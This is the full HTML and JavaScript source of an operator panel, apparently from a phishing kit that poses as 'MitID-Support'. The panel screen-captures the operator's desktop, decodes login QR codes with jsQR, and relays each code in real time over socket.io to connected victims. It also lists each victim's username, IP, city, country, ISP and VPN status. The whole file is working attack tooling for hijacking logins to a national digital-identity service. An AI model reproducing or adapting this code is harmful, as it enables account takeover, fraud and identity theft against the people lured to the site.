<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Admin Panel - Support QR</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="/socket.io/socket.io.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
  <style>
    body { background:#f8f9fa; }
    .container { max-width:1100px; }
    #qrCanvas { display:inline-block; margin-top:8px; }
    #debugLog { background:#eee; padding:10px; height:200px; overflow:auto; }
    td.gray { color: gray; }
  </style>
</head>
<body>
  <div class="container my-4">
    <div class="d-flex align-items-center mb-4">
      <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="logo" style="width:50px;height:auto;margin-right:12px;">
      <h3 class="m-0">MitID-Support — Admin Panel</h3>
    </div>
    <div class="alert alert-info">
      Instruct users to navigate to: <strong><span id="siteUrl"></span></strong>
    </div>

    <div class="mb-3">
      <button id="start" class="btn btn-success">Start Stream</button>
      <button id="stop" class="btn btn-danger">Stop Stream</button>
      <button id="hide" class="btn btn-warning">Hide QR</button>
      <button id="show" class="btn btn-info">Show QR</button>
    </div>

    <h5>Connected Clients (<span id="clientCount">0</span>)</h5>
    <div class="mb-3" style="max-height: 240px; overflow-y: auto;">
      <table class="table table-striped table-sm">
        <thead>
          <tr>
            <th>Username</th>
            <th>IP</th>
            <th>City</th>
            <th>Region</th>
            <th>Country</th>
            <th>ISP</th>
            <th>VPN</th>
            <th>Ping</th>
          </tr>
        </thead>
        <tbody id="clientListBody"></tbody>
      </table>
    </div>

    <h5>QR Preview</h5>
    <div id="qrCanvas"></div>
    <h5 class="mt-3">Screen Capture Preview</h5>
    <video id="video" width="640" height="360" autoplay style="border:1px solid #ccc"></video>
    <canvas id="canvas" width="1280" height="720" style="display:none"></canvas>
    <h5 class="mt-3">Debug Log</h5>
    <div id="debugLog"></div>
  </div>

<script>
(() => {
  const socket = io();
  socket.emit('join', 'admin');
  const debugLog = document.getElementById('debugLog');
  const qrCanvasDiv = document.getElementById('qrCanvas');
  const clientListBody = document.getElementById('clientListBody');
  const clientCountEl = document.getElementById('clientCount');
  document.getElementById('siteUrl').textContent = window.location.origin;

  function log(msg){const p=document.createElement('p');p.textContent=new Date().toLocaleTimeString()+' - '+msg;debugLog.appendChild(p);debugLog.scrollTop=debugLog.scrollHeight;}

  document.getElementById('start').onclick = () => startStream();
  document.getElementById('stop').onclick = () => stopStream();
  document.getElementById('hide').onclick = () => socket.emit('toggle_hide', true);
  document.getElementById('show').onclick = () => socket.emit('toggle_hide', false);

  socket.on('client_list', (list) => {
    clientListBody.innerHTML = '';
    clientCountEl.textContent = list.length;
    list.forEach(c => {
      const tr = document.createElement('tr');
      if (c.username.includes('Not logged')) tr.classList.add('gray');
      tr.innerHTML = `
        <td>${c.username}</td>
        <td>${c.ip||''}</td>
        <td>${c.city||''}</td>
        <td>${c.region||''}</td>
        <td>${(c.countryFlag||'')+' '+(c.country||'')}</td>
        <td>${c.isp||''}</td>
        <td>${c.vpn?'✅':'❌'}</td>
        <td>${c.ping||''}</td>`;
      clientListBody.appendChild(tr);
    });
  });

  socket.on('qr_preview', v => {
    qrCanvasDiv.innerHTML='';
    if(v)new QRCode(qrCanvasDiv,{text:v,width:128,height:128});
  });

  socket.on('ping', t => socket.emit('pong', t));

  async function startStream(){
    try{
      const stream=await navigator.mediaDevices.getDisplayMedia({video:true});
      const video=document.getElementById('video');
      video.srcObject=stream;video.muted=true;await video.play();
      log('Screen sharing started');
      detectLoop(stream);
      socket.emit('start_stream');
    }catch(e){log('Error: '+e.message);}
  }

  function stopStream(){
    const v=document.getElementById('video');
    if(v.srcObject)v.srcObject.getTracks().forEach(t=>t.stop());
    socket.emit('stop_stream');
    log('Stream stopped');
  }

  async function detectLoop(stream){
    const video=document.getElementById('video');
    const canvas=document.getElementById('canvas');
    const ctx=canvas.getContext('2d');
    setInterval(()=>{
      if(!video.videoWidth)return;
      canvas.width=video.videoWidth;canvas.height=video.videoHeight;
      ctx.drawImage(video,0,0,canvas.width,canvas.height);
      const img=ctx.getImageData(0,0,canvas.width,canvas.height);
      const code=jsQR(img.data,img.width,img.height);
      if(code&&code.data){
        socket.emit('qr_update',code.data);
        log('QR detected: '+code.data);
      }
    },500);
  }
})();
</script>
</body>
</html>
